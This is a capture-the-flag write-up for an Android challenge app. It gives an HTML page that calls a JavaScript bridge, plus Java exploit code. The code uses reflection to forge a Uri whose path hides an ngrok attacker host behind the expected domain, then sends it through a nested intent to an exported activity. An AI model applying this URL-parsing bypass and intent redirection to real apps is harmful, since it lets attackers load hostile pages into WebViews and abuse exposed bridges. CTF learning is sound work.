## Writeup

1. Bypass the root detection and emulator check, if you are using any of these
2. Host one HTML file with the below code
```
<html>

<body>
	
<script type="text/javascript">
app.makeToast();


</script>
</body>



</html>


```
3. Now, Build one more application with the below code and replace the ngrok URL with the URL of the hosted HTML page. you will see flag in the toast and in the logs as well


```
 Uri uri;
        try {
            Class partClass = Class.forName("android.net.Uri$Part");
            Constructor partConstructor = partClass.getDeclaredConstructors()[0];
            partConstructor.setAccessible(true);

            Class pathPartClass = Class.forName("android.net.Uri$PathPart");
            Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
            pathPartConstructor.setAccessible(true);

            Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
            Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
            hierarchicalUriConstructor.setAccessible(true);

            Object authority = partConstructor.newInstance("winja.nullcon.net", "winja.nullcon.net");
            Object path = pathPartConstructor.newInstance("@e0e2-27-4-63-181.ngrok-free.app/flag.html", "@e0e2-27-4-63-181.ngrok-free.app/flag.html");
            uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
        } catch (Exception e) {
            System.out.println("Exception occurred");
            e.printStackTrace();
            throw new RuntimeException(e);
        }

        Intent intent = new Intent();
        intent.setClassName("com.example.androidchall1","com.example.androidchall1.DeepLinkActivity");
        intent.setData(uri);

        Intent intent1 = new Intent();
        intent1.setClassName("com.example.androidchall1","com.example.androidchall1.HandleActivity");
        intent1.putExtra("activity",intent);

        startActivity(intent1);

 ```